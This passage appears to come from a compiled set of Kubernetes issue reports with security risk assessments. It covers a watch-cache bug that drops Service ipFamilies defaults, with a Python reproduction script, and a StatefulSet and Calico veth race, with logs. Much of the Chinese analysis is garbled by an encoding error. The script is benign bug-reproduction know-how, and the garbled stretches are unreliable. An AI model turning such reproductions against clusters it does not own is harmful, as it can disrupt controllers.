	switch event.Type {
	case watch.Added, watch.Modified:
		if object, err := newCachingObject(event.Object); err == nil {
			event.Object = object
		} else {
			klog.Errorf("couldn't create cachingObject from: %#v", event.Object)
		}
		// Don't wrap PrevObject for update event (for create events it is nil).
		// We only encode those to deliver DELETE watch events, so if
		// event.Object is not nil it can be used only for watchers for which
		// selector was satisfied for its previous version and is no longer
		// satisfied for the current version.
		// This is rare enough that it doesn't justify making deep-copy of the
		// object (done by newCachingObject) every time.
	case watch.Deleted:
		// Don't wrap Object for delete events - these are not to deliver any
		// events. Only wrap PrevObject.
		if object, err := newCachingObject(event.PrevObject); err == nil {
			// Update resource version of the object.
			// event.PrevObject is used to deliver DELETE watch events and
			// for them, we set resourceVersion to <current> instead of
			// the resourceVersion of the last modification of the object.
			updateResourceVersion(object, versioner, event.ResourceVersion)
			event.PrevObject = object
		} else {
			klog.Errorf("couldn't create cachingObject from: %#v", event.Object)
		}
	}
}
```

#### Kubernetes version

<details>

[root@192-168-1-31 paas]# kubectl version
Client Version: v1.31.6-r0-31.0.3-arm64
Kustomize Version: v5.4.2
Server Version: v1.31.6

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
æ­¤Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šåœºæ™¯ä¸‹çš„è½¯ä»¶ç¼ºé™·ã€‚é—®é¢˜æ ¸å¿ƒåœ¨äºï¼Œå½“ä¸€ä¸ªä»æ—§ç‰ˆæœ¬Kubernetesï¼ˆ<1.20ï¼‰å‡çº§è€Œæ¥çš„é›†ç¾¤ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªä»æœªè¢«æ›´æ–°è¿‡çš„`Service`å¯¹è±¡ï¼ˆå› æ­¤åœ¨etcdä¸­ç¼ºå°‘`ipFamilies`å­—æ®µï¼‰æ—¶ï¼Œè‹¥é€šè¿‡`PATCH`æ“ä½œä»…æ›´æ–°è¯¥`Service`çš„`status`å­èµ„æºï¼Œé‚£ä¹ˆ`kube-apiserver`é€šè¿‡`watch`æœºåˆ¶æ¨é€çš„`MODIFIED`äº‹ä»¶ä¸­ï¼Œè¯¥`Service`å¯¹è±¡çš„`spec`éƒ¨åˆ†å°†ä¸ä¼šè¢«æ­£ç¡®åœ°å¡«å……é»˜è®¤å€¼ï¼Œå¯¼è‡´`spec.ipFamilies`å­—æ®µç¼ºå¤±ã€‚

æ ¹æ®é—®é¢˜æè¿°ï¼Œè¿™ä¸ªç¼ºé™·çš„æ ¹æºåœ¨äº`kube-apiserver`çš„`watch`ç¼“å­˜æœºåˆ¶ã€‚åœ¨å¤„ç†`watch`äº‹ä»¶æ—¶ï¼Œå¯¹è±¡è¢«å°è£…åœ¨`cachingObject`ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹è·³è¿‡äº†`defaultOnRead`è¿™ä¸ªç”¨äºåœ¨è¯»å–å¯¹è±¡æ—¶å¡«å……é»˜è®¤å€¼çš„å‡½æ•°ã€‚è¿™å¯¼è‡´äº†APIå®¢æˆ·ç«¯ï¼ˆå¦‚`kube-controller-manager`æˆ–å…¶ä»–operatorï¼‰é€šè¿‡`watch`æ¥æ”¶åˆ°çš„å¯¹è±¡ä¸ç›´æ¥`GET`è¯¥å¯¹è±¡æ‰€è·å¾—çš„å†…å®¹ä¸ä¸€è‡´ï¼Œå‰è€…ç¼ºå°‘äº†åº”æœ‰çš„é»˜è®¤å­—æ®µã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š
1.  **å½±å“èŒƒå›´**ï¼šæ­¤é—®é¢˜å½±å“æ‰€æœ‰ä¾èµ–`watch`æœºåˆ¶æ¥è·å–`Service`å¯¹è±¡æ›´æ–°çš„ç»„ä»¶ã€‚å¦‚æœè¿™äº›ç»„ä»¶çš„é€»è¾‘ä¸¥æ ¼ä¾èµ–`spec.ipFamilies`å­—æ®µçš„å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å­—æ®µç¼ºå¤±åšå…¼å®¹å¤„ç†ï¼Œå°±å¯èƒ½å¯¼è‡´ç¨‹åºææ…Œï¼ˆpanicï¼‰ã€å´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚
2.  **æ½œåœ¨å±å®³**ï¼šæœ€ç›´æ¥çš„æ½œåœ¨å±å®³æ˜¯é’ˆå¯¹æ§åˆ¶å™¨çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªè‡ªå®šä¹‰çš„æˆ–ç¬¬ä¸‰æ–¹çš„ç½‘ç»œæ§åˆ¶å™¨å¦‚æœæœªèƒ½å¤„ç†è¿™ç§æƒ…å†µï¼Œå¯èƒ½ä¼šåœ¨æ¥æ”¶åˆ°è¿™ä¸ªâ€œä¸å®Œæ•´â€çš„äº‹ä»¶åå´©æºƒå¹¶ä¸æ–­é‡å¯ï¼Œä»è€Œå¯¼è‡´å…¶ç®¡ç†çš„æœåŠ¡ä¸­æ–­ã€‚é—®é¢˜æè¿°ä¸­æåˆ°ï¼Œ`endpointslice-controller`æœ‰ç›¸åº”çš„å›é€€æœºåˆ¶ï¼Œå¯ä»¥å¤„ç†è¿™ç§æƒ…å†µï¼Œè¿™é™ä½äº†å¯¹æ ¸å¿ƒç»„ä»¶çš„é£é™©ã€‚ä½†ä¸èƒ½ä¿è¯æ‰€æœ‰å®¢æˆ·ç«¯éƒ½æœ‰åŒæ ·å¥å£®çš„å¤„ç†é€»è¾‘ã€‚
3.  **è§¦å‘æ¡ä»¶**ï¼šè§¦å‘æ­¤é—®é¢˜éœ€è¦å¯¹`Service`çš„`status`å­èµ„æºæœ‰`PATCH`æƒé™ã€‚è¿™é€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–å…·æœ‰ç‰¹å®šè§’è‰²çš„æœåŠ¡è´¦æˆ·ï¼ˆå¦‚äº‘å‚å•†çš„`cloud-controller-manager`ï¼‰æ‰æ‹¥æœ‰çš„é«˜çº§æƒé™ï¼Œæ™®é€šç”¨æˆ·æ— æ³•æ‰§è¡Œæ­¤æ“ä½œã€‚
4.  **æ¼æ´ç±»å‹**ï¼šè¯¥é—®é¢˜å±äºâ€œéé¢„æœŸçš„è¡Œä¸ºâ€æˆ–â€œæ•°æ®ä¸ä¸€è‡´â€ï¼Œå¯è¢«åˆ©ç”¨äºå‘åŠ¨æœ‰é’ˆå¯¹æ€§çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚å®ƒä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€ä¿¡æ¯æ³„éœ²ç­‰é«˜å±é£é™©ã€‚

æ ¹æ®CVSS 3.1è¯„åˆ†æ ‡å‡†ï¼š
*   **Attack Vector (AV): Network (N)** - é€šè¿‡Kubernetes APIå‘èµ·æ”»å‡»ã€‚
*   **Attack Complexity (AC): High (H)** - éœ€è¦æ»¡è¶³ç‰¹å®šæ¡ä»¶ï¼šä¸€ä¸ªä»æ—§ç‰ˆæœ¬å‡çº§çš„é›†ç¾¤ï¼Œå­˜åœ¨ç‰¹å®šçš„æ—§Serviceå¯¹è±¡ï¼Œå¹¶ä¸”æ”»å‡»è€…éœ€è¦è·å–å¯¹è¯¥Serviceçš„status patchæƒé™ã€‚
*   **Privileges Required (PR): High (H)** - æ”»å‡»è€…éœ€è¦è·å¾—å¯¹`services/status`å­èµ„æºçš„`patch`æƒé™ï¼Œè¿™æ˜¯ä¸€ä¸ªé«˜æƒé™æ“ä½œã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged (U)** - å½±å“èŒƒå›´å±€é™åœ¨è®¢é˜…watchçš„ç»„ä»¶æœ¬èº«ï¼Œæœªè·¨è¶Šå®‰å…¨è¾¹ç•Œã€‚
*   **Confidentiality (C): None (N)** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
*   **Integrity (I): Low (L)** - å¯¼è‡´watchäº‹ä»¶ä¸­çš„æ•°æ®ä¸å®Œæ•´ï¼Œå½±å“äº†æ•°æ®ä¸€è‡´æ€§ï¼Œä½†etcdä¸­å­˜å‚¨çš„å¯¹è±¡çŠ¶æ€æœ€ç»ˆæ˜¯æ­£ç¡®çš„ã€‚
*   **Availability (A): Low (L)** - å¯èƒ½å¯¼è‡´ä¾èµ–æ­¤å­—æ®µçš„æ§åˆ¶å™¨åŠŸèƒ½ä¸­æ–­ï¼Œé€ æˆå±€éƒ¨æ‹’ç»æœåŠ¡ã€‚

ç»¼åˆè¯„åˆ†ä¸º `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:L/A:L`ï¼ŒåŸºç¡€åˆ†æ•°ä¸º 3.1ï¼Œå±äºä½é£é™©ã€‚è™½ç„¶åœ¨å¤šç§Ÿæˆ·åœºæ™¯ä¸‹ï¼Œä¸€ä¸ªç§Ÿæˆ·ç†è®ºä¸Šå¯èƒ½å½±å“åˆ°é›†ç¾¤çº§çš„æ§åˆ¶å™¨ï¼Œä½†ç”±äºè§¦å‘æ‰€éœ€æƒé™è¾ƒé«˜ï¼Œä¸”æ ¸å¿ƒç»„ä»¶å·²å…·å¤‡å®¹é”™èƒ½åŠ›ï¼Œå› æ­¤æ•´ä½“é£é™©å¯æ§ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import threading
import time
import os
import uuid

# å…¨å±€äº‹ä»¶ï¼Œç”¨äºçº¿ç¨‹é—´é€šä¿¡
bug_reproduced_event = threading.Event()

def watcher_thread(api_client, namespace, service_name, timeout):
    """
    åœ¨åå°çº¿ç¨‹ä¸­ç›‘è§†Serviceçš„å˜åŒ–ã€‚
    """
    print(f"[Watcher] Starting to watch service '{service_name}' in namespace '{namespace}'.")
    w = kubernetes.watch.Watch()
    start_time = time.time()
    try:
        # streamæ–¹æ³•ä¼šé˜»å¡ï¼Œç›´åˆ°è¶…æ—¶æˆ–æœ‰äº‹ä»¶å‘ç”Ÿ
        for event in w.stream(api_client.list_namespaced_service, namespace=namespace, field_selector=f"metadata.name={service_name}", _request_timeout=timeout):
            event_type = event['type']
            service_object = event['object']
            print(f"[Watcher] Received event: {event_type}")

            if event_type == 'MODIFIED':
                print("[Watcher] Analyzing MODIFIED event...")
                # æ£€æŸ¥V1Serviceå¯¹è±¡ä¸­çš„ip_familieså­—æ®µ
                # æ ¹æ®bugæè¿°ï¼Œåœ¨patch statusåï¼Œwatchäº‹ä»¶ä¸­çš„å¯¹è±¡specå¯èƒ½ä¸å«ip_families
                if not hasattr(service_object.spec, 'ip_families') or service_object.spec.ip_families is None:
                    print("\033[92m[SUCCESS] Bug reproduced! The 'ip_families' field is missing in the MODIFIED event's object spec.\033[0m")
                    bug_reproduced_event.set()
                    w.stop()
                    return
                else:
                    print(f"[Watcher] 'ip_families' field found: {service_object.spec.ip_families}. Continuing to watch.")
            
            if time.time() - start_time > timeout:
                print("[Watcher] Watcher timed out.")
                w.stop()
                return

    except Exception as e:
        # å½“Serviceè¢«åˆ é™¤æ—¶ï¼Œwatchå¯èƒ½ä¼šä¸­æ–­ï¼Œè¿™æ˜¯æ­£å¸¸ç°è±¡
        if isinstance(e, kubernetes.client.ApiException) and e.status == 410:
             print("[Watcher] Watch stream closed as expected after resource deletion.")
        else:
            print(f"\033[91m[Watcher] An error occurred in watcher thread: {e}\033[0m")

def main():
    """
    ä¸»å‡½æ•°ï¼Œæ‰§è¡Œå¤ç°é€»è¾‘ã€‚
    """
    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        kubernetes.config.load_kube_config()
        api = kubernetes.client.CoreV1Api()
    except Exception as e:
        print(f"\033[91m[ERROR] Could not load Kubernetes configuration: {e}\033[0m")
        print("[ERROR] Please ensure your kubeconfig is set up correctly.")
        return

    namespace = "default"
    service_name = f"poc-service-{uuid.uuid4().hex[:8]}"
    
    # å®šä¹‰Serviceå¯¹è±¡
    service_body = kubernetes.client.V1Service(
        api_version="v1",
        kind="Service",
        metadata=kubernetes.client.V1ObjectMeta(name=service_name),
        spec=kubernetes.client.V1ServiceSpec(
            selector={"app": "test"},
            ports=[kubernetes.client.V1ServicePort(protocol="TCP", port=80, target_port=8080)]
        )
    )

    # å¯åŠ¨åå°ç›‘è§†çº¿ç¨‹
    # è®¾ç½®è¶…æ—¶ä¸º110ç§’ï¼Œç¡®ä¿è„šæœ¬åœ¨2åˆ†é’Ÿå†…ç»“æŸ
    watcher = threading.Thread(target=watcher_thread, args=(api, namespace, service_name, 110))
    watcher.daemon = True
    watcher.start()

    try:
        # 1. åˆ›å»ºService
        print(f"[Main] Creating service '{service_name}'...")
        api.create_namespaced_service(namespace=namespace, body=service_body)
        print("[Main] Service created.")
        
        # ç­‰å¾…ä¸€æ®µæ—¶é—´ï¼Œç¡®ä¿watcherå·²ç»å¼€å§‹ç›‘è§†
        time.sleep(5)

        # 2. Patch Service Statusï¼Œè¿™æ˜¯è§¦å‘é—®é¢˜çš„å…³é”®æ­¥éª¤
        print("[Main] Patching service status to trigger the bug...")
        patch_body = {
            "status": {
                "loadBalancer": {
                    "ingress": [{"ip": "8.8.8.8"}]
                }
            }
        }
        api.patch_namespaced_service_status(name=service_name, namespace=namespace, body=patch_body)
        print("[Main] Service status patched.")

        # 3. ç­‰å¾…watcherçº¿ç¨‹çš„ç»“æœ
        print("[Main] Waiting for watcher to detect the bug (max 30 seconds)...")
        reproduced = bug_reproduced_event.wait(timeout=30)
        
        if not reproduced:
             # å¦‚æœç­‰å¾…è¶…æ—¶ï¼Œå¯èƒ½æ˜¯å› ä¸ºç¯å¢ƒä¸åŒæˆ–bugå·²ä¿®å¤
             print("\033[93m[INFO] Bug was not reproduced within the timeframe.\033[0m")
             print("[INFO] This could mean the bug is fixed in your k8s version or the environment differs.")

    except kubernetes.client.ApiException as e:
        print(f"\033[91m[Main] An API error occurred: {e.reason} (Status: {e.status})\033[0m")
        print(f"[Main] Body: {e.body}")
    except Exception as e:
        print(f"\033[91m[Main] An unexpected error occurred: {e}\033[0m")
    finally:
        # 4. æ¸…ç†èµ„æº
        print(f"[Main] Cleaning up: deleting service '{service_name}'...")
        try:
            api.delete_namespaced_service(name=service_name, namespace=namespace)
            print("[Main] Cleanup complete.")
        except kubernetes.client.ApiException as e:
            # å¦‚æœèµ„æºå·²ä¸å­˜åœ¨ï¼Œå¿½ç•¥404é”™è¯¯
            if e.status != 404:
                print(f"\033[91m[Main] Error during cleanup: {e}\033[0m")
        # ç­‰å¾…watcherçº¿ç¨‹ç»“æŸ
        watcher.join(timeout=5)


# æ‰§è¡Œä¸»å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬æ—¨åœ¨é€šè¿‡ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„æ¼æ´ã€‚
1.  **ç¯å¢ƒè®¾ç½®**ï¼šè„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonåº“åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼Œä»¥è·å–ä¸Kubernetesé›†ç¾¤é€šä¿¡çš„æƒé™ã€‚
2.  **åˆ›å»ºService**ï¼šè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªåä¸º`poc-service-<random-string>`çš„ç®€å•ClusterIPç±»å‹çš„`Service`ã€‚åˆ›å»ºæ—¶ï¼Œæˆ‘ä»¬æ²¡æœ‰æ˜¾å¼æŒ‡å®š`ipFamilies`ç­‰å­—æ®µï¼ŒæœŸæœ›`kube-apiserver`ä¼šè‡ªåŠ¨å¡«å……é»˜è®¤å€¼ã€‚
3.  **å¯åŠ¨Watcher**ï¼šåœ¨åˆ›å»º`Service`ä¹‹å‰ï¼Œè„šæœ¬ä¼šå¯åŠ¨ä¸€ä¸ªç‹¬ç«‹çš„åå°çº¿ç¨‹ã€‚è¯¥çº¿ç¨‹ä½¿ç”¨`watch`æœºåˆ¶ä¸“é—¨ç›‘è§†æˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„`Service`å¯¹è±¡ã€‚
4.  **è§¦å‘ç¼ºé™·**ï¼šä¸»çº¿ç¨‹åœ¨åˆ›å»º`Service`å¹¶ç¨ä½œç­‰å¾…åï¼Œä¼šè°ƒç”¨`patch_namespaced_service_status`æ–¹æ³•æ¥æ›´æ–°`Service`çš„`status`å­èµ„æºã€‚æ ¹æ®Issueæè¿°ï¼Œè¿™ä¸ªç‰¹å®šçš„æ“ä½œä¼šè§¦å‘`apiserver` watchç¼“å­˜çš„ç¼ºé™·ã€‚
5.  **æ¼æ´éªŒè¯**ï¼šåå°çš„`watcher`çº¿ç¨‹ä¼šæ¥æ”¶åˆ°`Service`çš„`MODIFIED`äº‹ä»¶ã€‚æ­¤æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥äº‹ä»¶ä¸­åŒ…å«çš„`Service`å¯¹è±¡çš„`spec`ã€‚å¦‚æœ`spec.ip_families`å­—æ®µä¸º`None`æˆ–ä¸å­˜åœ¨ï¼Œå°±æ„å‘³ç€`apiserver`æ²¡æœ‰æ­£ç¡®åœ°ä¸ºè¿™ä¸ªwatchäº‹ä»¶ä¸­çš„å¯¹è±¡å¡«å……é»˜è®¤å€¼ï¼ŒæˆåŠŸå¤ç°äº†è¯¥ç¼ºé™·ã€‚è„šæœ¬ä¼šæ‰“å°ç»¿è‰²çš„æˆåŠŸä¿¡æ¯ã€‚
6.  **ç»“æœä¸è¶…æ—¶**ï¼šä¸»çº¿ç¨‹ä¼šç­‰å¾…ä¸€ä¸ªä¿¡å·ï¼ˆ`threading.Event`ï¼‰ï¼Œè¯¥ä¿¡å·ç”±`watcher`çº¿ç¨‹åœ¨æˆåŠŸå¤ç°é—®é¢˜æ—¶è®¾ç½®ã€‚å¦‚æœç­‰å¾…è¶…æ—¶ï¼Œè„šæœ¬ä¼šæŠ¥å‘Šé—®é¢˜æœªè¢«å¤ç°ï¼Œè¿™å¯èƒ½è¡¨ç¤ºå½“å‰ç¯å¢ƒçš„Kubernetesç‰ˆæœ¬å·²ç»ä¿®å¤äº†æ­¤é—®é¢˜ã€‚
7.  **èµ„æºæ¸…ç†**ï¼šæ— è®ºå¤ç°æˆåŠŸä¸å¦ï¼Œè„šæœ¬çš„`finally`å—éƒ½ä¼šç¡®ä¿åˆ é™¤ä¹‹å‰åˆ›å»ºçš„`Service`ï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚æ•´ä¸ªè„šæœ¬è®¾è®¡äº†è¶…æ—¶æœºåˆ¶ï¼Œç¡®ä¿åœ¨2åˆ†é’Ÿå†…æ‰§è¡Œå®Œæ¯•å¹¶é€€å‡ºã€‚

è¦è¿è¡Œæ­¤è„šæœ¬ï¼Œä½ éœ€è¦ï¼š
*   å®‰è£…Pythonã€‚
*   å®‰è£…`kubernetes`åº“ (`pip install kubernetes`)ã€‚
*   æ‹¥æœ‰ä¸€ä¸ªå¯è®¿é—®çš„Kubernetesé›†ç¾¤ï¼Œå¹¶ä¸”ä½ çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸åœ¨`~/.kube/config`ï¼‰å·²æ­£ç¡®é…ç½®ï¼Œå…·æœ‰åœ¨`default`å‘½åç©ºé—´åˆ›å»ºå’Œåˆ é™¤`Service`çš„æƒé™ã€‚

---


## Issue #131775 The pod garbage collector deletes the old pod that is terminated during the statefulset rolling upgrade. As a result, kubelet does not completely delete the corresponding process of the old pod and the new pod is started.

- Issue é“¾æ¥ï¼š[#131775](https://github.com/kubernetes/kubernetes/issues/131775)

### Issue å†…å®¹

#### What happened?

During large-scale cluster upgrades (e.g., 200+ nodes), when kube-controller-manager forcibly deletes pods due to exceeding --terminated-pod-gc-threshold, StatefulSet pods may experience network corruption. If a new pod (cmdAdd) is scheduled before the old pod completes CNI teardown (cmdDel), both pods share the same veth name (derived from namespace/name). The delayed cmdDel of the old pod deletes the new pod's veth device, breaking its network connectivity.

Calico generates veth names using pod name + namespace (e.g., cali12345 from hash of <namespace>.<pod_name>).
When a StatefulSet pod is forcibly deleted, the old pod's cmdDel may delete the new pod's veth device due to identical naming.
Results in new pod networking failures: missing network interface, unreachable status

#### What did you expect to happen?

The garbage collector should not reclaim pods that are terminating during statefulset rolling upgrade.

#### How can we reproduce it (as minimally and precisely as possible)?

Set the --terminated-pod-gc-threshold parameter of kube-controller-manager to a small value to ensure that the number of pods that can be reclaimed by the garbage collector in the cluster exceeds the threshold. At the same time, the statefulset is upgraded in a rolling manner.

#### Anything else we need to know?

After reorganizing the logs, we found the following sequence between the old and new pods:

- Call old pod cmdAdd;
- Call new pod cmdAdd;
- New pod cmdAdd acquires IPAM lock;
- Old pod cmdAdd succeeds;
- Old pod cmdAdd acquires IPAM lock; deletes the veth pair device pair of the new pod.
Therefore, the reasons for this issue include:

- kube-controller-manager forcibly deletes the pod, causing the new pod to be created without waiting for the old pod to completely terminate.
- Acquiring the IPAM lock is not sequential. The root cause may be the upgrade of a large number of pods in a 200-node cluster, which puts pressure on the kube-apiserver. Slow kube-apiserver response leads to slow CNI execution speed, with multiple processes waiting for the IPAM lock.
The relevant logs are as follows:
22:39:43 [old pod] create
`kube-apiserver-access.log_20250506-144105.gz:2025-05-06 14:39:43.923902576, system:kube-scheduler, [192.168.64.17], create, /api/v1/namespaces/manager/pods/secretstore-0/binding, 48, 28.517545ms, 201`
22:39:45 [old pod] runPodSandbox
`time="2025-05-06T22:39:45.766532830+08:00" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:secretstore-0,Uid:1f27ab7d-db36-4e8e-acc6-dc57b51faaf6,Namespace:manager,Attempt:0,}`
22:39:45 [old pod] cni cmdAdd
`2025-05-06 22:39:45.803 [INFO][615021] k8s.go 517: New Config from certs
2025-05-06 22:39:45.805 [INFO][615021] plugin.go 226: create client success
2025-05-06 22:39:46.805 [INFO][615021] plugin.go 330: Calico CNI found existing endpoint: .... ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781" Namespace="manager" Pod="secretstore-0" WorkloadEndpoint="master3-k8s-secretstore--0-"`
22:39:50 [old pod] delete (by kube-controller manager GC)
`kube-apiserver-access.log_20250506-144105.gz:2025-05-06 14:39:50.639256933, system:serviceaccount:kube-system:pod-garbage-collector, [192.168.64.17], delete, /api/v1/namespaces/manager/pods/secretstore-0, 14185, 468.422362ms, 200`
22:39:53 [new pod] create
`kube-apiserver-access.log_20250506-144105.gz:2025-05-06 14:39:53.996322883, system:kube-scheduler, [192.168.64.17], create, /api/v1/namespaces/manager/pods/secretstore-0/binding, 48, 14.088814ms, 201`
22:39:54 [new pod] runPodSandbox
`time="2025-05-06T22:39:54.916301409+08:00" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:secretstore-0,Uid:c8180914-a686-4f46-9268-b22fae4b3eb6,Namespace:manager,Attempt:0,}"`
22:39:54 [newpod] cni cmdAdd
`2025-05-06 22:39:54.949 [INFO][615867] k8s.go 517: New Config from certs
2025-05-06 22:39:54.951 [INFO][615867] plugin.go 226: create client success
2025-05-06 22:39:55.042 [INFO][615867] plugin.go 330: Calico CNI found existing endpoint: ... ContainerID="4d050b94217a39dea0436d1ed2ea089ca0142171426ecd26abdc170b82500512" Namespace="manager" Pod="secretstore-0" WorkloadEndpoint="master3-k8s-secretstore--0-"`
22:39:56 [new pod] acquired ipam lock
`2025-05-06 22:39:56.123 [INFO][615935] ipam_plugin.go 370: About to acquire host-wide IPAM lock.
2025-05-06 22:39:56.123 [INFO][615935] ipam_plugin.go 387: Acquired host-wide IPAM lock.`
22:40:02 [new pod] cni cmdAdd success
`2025-05-06 22:40:01.660 [INFO][615867] k8s.go 414: Added Mac, interface name, and active container ID to endpoint ..., InterfaceName:"califf8cd50f40a"...
2025-05-06 22:40:02.119 [INFO][615867] k8s.go 499: Wrote updated endpoint to datastore ContainerID="4d050b94217a39dea0436d1ed2ea089ca0142171426ecd26abdc170b82500512" Namespace="manager" Pod="secretstore-0" WorkloadEndpoint="master3-k8s-secretstore--0-eth0"`
22:40:02 [new pod] runPodSandbox success
`time="2025-05-06T22:40:02.196019840+08:00" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:secretstore-0,Uid:c8180914-a686-4f46-9268-b22fae4b3eb6,Namespace:manager,Attempt:0,} returns sandbox id \"4c8180914d050b94217a39dea0436d1ed2ea089ca0142171426ecd26abdc170b82500512\""`
22:40:02 [old pod] acquired ipam lock
`2025-05-06 22:39:47.214 [INFO][615093] ipam_plugin.go 370: About to acquire host-wide IPAM lock.
2025-05-06 22:40:02.221 [INFO][615093] ipam_plugin.go 387: Acquired host-wide IPAM lock.`
22:40:03 [old pod] clean new pod's veth
`2025-05-06 22:40:03.903 [INFO][615021] dataplane_linux.go 88: Cleaning old hostVeth: califf8cd50f40a ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781" Namespace="manager" Pod="secretstore-0" WorkloadEndpoint="master3-k8s-secretstore--0-eth0"`
22:40:04 [old pod] cni cmdAdd success
`2025-05-06 22:40:04.097 [INFO][615021] k8s.go 499: Wrote updated endpoint to datastore ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781" Namespace="manager" Pod="secretstore-0" WorkloadEndpoint="master3-k8s-secretstore--0-eth0"`
22:40:04 [old pod] runPodSandbox success
`time="2025-05-06T22:40:04.174901693+08:00" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:secretstore-0,Uid:1f27ab7d-db36-4e8e-acc6-dc57b51faaf6,Namespace:manager,Attempt:0,} returns sandbox id \"ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781\""`
22:40:04 [old pod] stopPodSandbox
`time="2025-05-06T22:40:04.631607591+08:00" level=info msg="StopPodSandbox for \"ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781\""`
22:40:04 [old pod] cni cmdDel
`22:40:04.696 [INFO][616973] k8s.go 517: New Config from certs
22:40:05.308 [INFO][616973] k8s.go 586: Cleaning up netns ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781"
22:40:05.308 [INFO][616973] dataplane_linux.go 536: Deleting workload's device in netns. ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781" iface="eth0" netns="/var/run/netns/cni-885b6aec-42b6-c1a7-de62-b6aa0f24403e"`
22:40:08 [old pod] acquired ipam lock
`2025-05-06 22:40:05.360 [INFO][617002] ipam_plugin.go 370: About to acquire host-wide IPAM lock.
2025-05-06 22:40:08.362 [INFO][617002] ipam_plugin.go 387: Acquired host-wide IPAM lock.`
22:40:14 [old pod] cni cmdDel success
`2025-05-06 22:40:14.816 [INFO][616973] k8s.go 599: Teardown processing complete. ContainerID="ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781"`
22:40:14 [old pod] stopPodSandbox success
`time="2025-05-06T22:40:14.819257402+08:00" level=info msg="TearDown network for sandbox \"ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781\" successfully"
time="2025-05-06T22:40:14.819287327+08:00" level=info msg="StopPodSandbox for \"ae6f56c3c0d3d052d8cbc87fc772aab343d4fa400adf73969424f9749978d781\" returns successfully"`



#### Kubernetes version

<details>

```console
$ kubectl version
1.31.1
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# Operating System and version: eulerosv2r13
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
Calico version v3.27.3
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹çš„ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´StatefulSetä¸­æ–°Podçš„ç½‘ç»œä¸­æ–­ã€‚

é—®é¢˜æ ¹æºåœ¨äºKubernetesçš„Podåƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆPod Garbage Collectorï¼‰ä¸StatefulSetæ»šåŠ¨æ›´æ–°çš„äº¤äº’è¿‡ç¨‹ã€‚å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **è§¦å‘æ¡ä»¶**ï¼šåœ¨å¤§å‹é›†ç¾¤ï¼ˆå¦‚200+èŠ‚ç‚¹ï¼‰è¿›è¡Œæ»šåŠ¨å‡çº§æ—¶ï¼Œå¦‚æœé›†ç¾¤ä¸­å·²ç»ˆæ­¢ï¼ˆTerminatedï¼‰çš„Podæ•°é‡è¶…è¿‡äº†`kube-controller-manager`çš„`--terminated-pod-gc-threshold`é˜ˆå€¼ï¼ŒPodåƒåœ¾å›æ”¶å™¨ä¼šå¼€å§‹å¼ºåˆ¶åˆ é™¤è¿™äº›å·²ç»ˆæ­¢çš„Podå¯¹è±¡ã€‚
